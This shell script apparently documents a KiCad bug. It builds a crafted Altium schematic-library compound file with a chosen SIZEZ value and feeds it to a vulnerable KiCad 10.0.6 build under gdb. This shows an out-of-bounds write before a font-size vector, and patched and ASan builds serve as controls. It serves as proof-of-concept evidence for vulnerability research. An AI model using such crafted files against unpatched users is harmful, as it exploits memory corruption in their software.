#!/bin/sh
# Chosen-value counterexample for the KiCad-own-compound-file-reader lane.
#
# Builds a real CFB fixture whose FileHeader carries a caller-chosen SIZEZ
# value, delivers it through KiCad 10.0.6's verbatim compoundfilereader, and
# stops at pinned sch_io_altium.cpp.vuln:5919 to read the four bytes actually
# written before the vector. The fixed build is the control: same file bytes.
#
# Usage: sh chosen-value.sh [decimal SIZEZ value]  (default 925327927)
# Outputs: evidence/FileHeader-chosen-VALUE.SchLib and evidence/chosen-VALUE-*.out
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
ROOT=$(CDPATH= cd -- "$HERE/.." && pwd)
VALUE=${1:-925327927}
FIX="evidence/FileHeader-chosen-$VALUE.SchLib"
TAG="chosen-$VALUE"

mkdir -p "$HERE/evidence"
cd "$HERE"

python3 - "$FIX" "$VALUE" "$ROOT/realcfb" <<'PY'
import struct
import sys

out, value, libdir = sys.argv[1], sys.argv[2], sys.argv[3]
sys.path.insert(0, libdir)
import make_cfb  # committed fixture builder; no upstream bytes change

payload = b"|HEADER=" + make_cfb.HEADER_TEXT + b"|SIZE1=10|SIZEZ=" + value.encode() + b"|\x00"
stream = struct.pack("<I", len(payload)) + payload
with open(out, "wb") as f:
    f.write(make_cfb.build(stream))
print("wrote %s stream=%d value=%s" % (out, len(stream), value))
PY

# Independent read-back: this is a real compound file with the chosen key.
python3 - "$FIX" "$VALUE" > "evidence/$TAG-olefile.out" 2>&1 <<'PY'
import olefile
import sys

path, value = sys.argv[1], sys.argv[2]
key = ("SIZEZ=" + value).encode()
valid = olefile.isOleFile(path)
o = olefile.OleFileIO(path)
streams = o.listdir()
data = o.openstream("FileHeader").read()
o.close()
ok = valid and ["FileHeader"] in streams and key in data
print("chosen-olefile=%s streams=%s size=%d key_ok=%s %s"
      % (valid, streams, len(data), key in data, "PASS" if ok else "FAIL"))
PY

# Vulnerable build: break at pinned :5919, skip the valid SIZE1 hit, then
# print the index/value at the hostile hit and the four bytes after `next`.
set +e
gdb -q -batch -ex 'set pagination off' \
    -ex 'break sch_io_altium.cpp.vuln:5919' -ex "run $FIX" -ex 'continue' \
    -ex 'printf "IND=%d SCALED=0x%08x\n", ind, scaled' -ex 'next' \
    -ex 'x/4xb (char*)aFontSizes._M_impl._M_start-4' \
    ./g++-vuln-plain > "evidence/$TAG-gdb-vuln.out" 2>&1
gdb_rc=$?
./g++-fixed-plain "$FIX" > "evidence/$TAG-fixed-plain.out" 2>&1
fixed_rc=$?
ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 \
    ./g++-fixed-asan "$FIX" > "evidence/$TAG-fixed-asan.out" 2>&1
fixed_asan_rc=$?
set -e

printf 'VALUE=%s GDB_RC=%d FIXED_RC=%d FIXED_ASAN_RC=%d\n' \
    "$VALUE" "$gdb_rc" "$fixed_rc" "$fixed_asan_rc"
grep -E 'real-key: SIZEZ=|IND=|SCALED=|0x[0-9a-f]+:|rc=0 size=' \
     "evidence/$TAG-gdb-vuln.out" "evidence/$TAG-fixed-plain.out" || true
cat "evidence/$TAG-olefile.out"
